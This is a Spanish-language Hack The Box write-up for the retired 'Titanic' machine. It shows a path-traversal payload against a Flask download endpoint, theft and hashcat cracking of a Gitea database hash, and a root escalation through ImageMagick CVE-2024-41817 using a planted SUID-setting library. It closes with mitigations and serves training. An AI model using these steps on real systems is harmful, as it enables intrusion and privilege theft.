---
machine: Titanic
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, web, flask, gitea, imagemagick]
---

# Titanic — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

La aplicación Flask une el ticket con `os.path.join` y permite recorrer rutas en `/download`. Se lee el `.git` de Gitea y su base SQLite, se crackea el hash de `developer` y se entra por SSH. Un cron convierte imágenes con ImageMagick y es vulnerable a CVE-2024-41817: una biblioteca `libxcb.so.1` en el directorio de trabajo se carga como root.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22/tcp` OpenSSH en Ubuntu 22.04 y `80/tcp` Apache con una web de reservas.
- El vhost `titanic.htb` tiene un formulario que descarga un “ticket” en JSON.
- `gitea.titanic.htb` aloja Gitea y un repositorio público.

## Enumeración

- `/download?ticket=../../etc/passwd` devuelve el archivo: el `os.path.join` no confina la ruta.
- El repositorio de Gitea incluye `app.py` y la ruta de la base `gitea.db`.
- La base contiene el hash de `developer` y el repositorio revela el cron de ImageMagick.

## Foothold

Se descarga `gitea.db` con el traversal y se crackea el hash de `developer`. Con la contraseña se entra por SSH; la flag de usuario está en su home.

```bash
curl 'http://titanic.htb/download?ticket=../../home/developer/gitea/data/gitea/gitea.db' -o gitea.db
sqlite3 gitea.db 'select name,passwd_hash_algo,passwd from user;'
hashcat -m 10900 hash.txt rockyou.txt
ssh developer@titanic.htb
```

## Movimiento lateral

No hay otro host. El pivote es de la web a la base de Gitea, de ahí a la contraseña de `developer` y al acceso SSH local.

## Escalada de privilegios

El cron de root ejecuta `magick` sobre `/opt/automation/urgent/*.jpg`. ImageMagick 7.1.1-35 es vulnerable a CVE-2024-41817: carga `libxcb.so.1` desde el directorio actual. Se compila una biblioteca con un constructor que copia `/bin/bash` y le da SUID, se coloca junto a una imagen y se espera al cron.

```bash
gcc -shared -fPIC -o libxcb.so.1 pwn.c
cp libxcb.so.1 /opt/automation/urgent/
cp image.jpg /opt/automation/urgent/
# esperar el cron y ejecutar /tmp/rootbash -p
```

## Evidencia

- `/etc/passwd` leído con `ticket=../../`.
- Hash de `developer` crackeado y sesión SSH.
- `libxcb.so.1` cargada por el cron y `/tmp/rootbash` con SUID.

## Lecciones aprendidas

- `os.path.join` no impide un traversal si la entrada no se normaliza.
- Los repositorios y bases de Gitea pueden filtrar credenciales.
- ImageMagick carga bibliotecas desde el directorio de trabajo en versiones vulnerables.

## Mitigación y detección

- Resolver la ruta y comprobar que queda dentro del directorio permitido.
- Restringir el acceso a `.git` y a la base de Gitea.
- Actualizar ImageMagick y ejecutar conversiones en un directorio sin escritura.

## Referencias

- [0xdf — Titanic](https://0xdf.gitlab.io/2025/06/21/htb-titanic.html)
- [IppSec — Titanic](https://www.youtube.com/watch?v=2tQ3VhdwVsU)
- [Hack The Box — Titanic](https://app.hackthebox.com/machines/titanic)
